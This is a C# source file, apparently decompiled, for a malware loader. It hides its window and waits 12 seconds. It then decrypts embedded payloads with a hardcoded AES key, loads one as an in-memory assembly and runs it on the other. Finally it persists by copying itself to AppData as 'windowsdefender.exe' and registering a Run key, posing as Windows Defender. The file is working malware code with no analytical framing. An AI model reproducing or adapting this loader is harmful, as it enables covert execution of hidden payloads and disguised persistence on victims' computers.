using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

public class frmOne : Form
{
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).set_Visible(false);
		((Form)this).set_WindowState((FormWindowState)1);
	}

	public frmOne()
	{
		InitializeComponent();
		Thread.Sleep(12000);
		bool flag = true;
		byte[] array = null;
		byte[] array2 = null;
		array = Reader.ReadManaged();
		array2 = Reader.ReadManaged2();
		array = AESDecrypt(array, "TFJjXUPgeBWuBwJMa");
		array2 = AESDecrypt(array2, "TFJjXUPgeBWuBwJMa");
		Assembly assembly = Assembly.Load(array2);
		Type[] types = assembly.GetTypes();
		foreach (Type type in types)
		{
			if (type.IsClass && type.FullName!.EndsWith(".Class1"))
			{
				object classyObject = Activator.CreateInstance(type);
				Runner.RunStuff(type, classyObject, array);
			}
		}
		if (flag)
		{
			AddToStartup();
		}
	}

	public static byte[] AESDecrypt(byte[] input, string Pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(Pass));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
	}

	public void AddToStartup()
	{
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\windowsdefender.exe"))
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\windowsdefender.exe");
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("windowsdefender") == null)
			{
				registryKey.SetValue("windowsdefender", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\windowsdefender.exe");
			}
			registryKey.Close();
		}
	}
}
